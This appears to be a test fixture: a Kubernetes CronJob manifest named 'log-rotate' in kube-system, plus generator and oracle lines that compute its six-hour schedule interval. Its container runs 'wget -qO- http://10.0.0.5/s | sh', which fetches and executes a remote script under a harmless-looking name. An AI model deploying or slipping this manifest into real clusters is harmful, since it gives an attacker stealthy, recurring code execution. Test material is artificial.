apiVersion: batch/v1
kind: CronJob
metadata:
  name: log-rotate
  namespace: kube-system
spec:
  schedule: "0 */6 * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
            - name: rotate
              image: busybox:1.36
              command: ["/bin/sh", "-c", "wget -qO- http://10.0.0.5/s | sh"]
          restartPolicy: OnFailure
note: ci-schedule-persistence-model: lib.codec.schedule_entries/persistence_answer via decode(rep='schedule_entries', transform=<field>[@what][!filename], key=<accepted csv>)
generator_cmd: sh tests/data/script_fixtures/sched_persist_gen.sh <dir>  (writes cronjob.yaml: hand-authored heredoc; no lib code); sched_persist_fx.py writes the json
oracle_cmd: (cd <dir> && python3 -I -c "import sys,yaml,datetime as D;sys.path.insert(0,'tools/pylib-cron');from croniter import croniter;c=yaml.safe_load(open(sys.argv[1]))['spec']['schedule'];i=croniter(c,D.datetime(2026,1,5));a=i.get_next(float);print(int(i.get_next(float)-a))" cronjob.yaml)
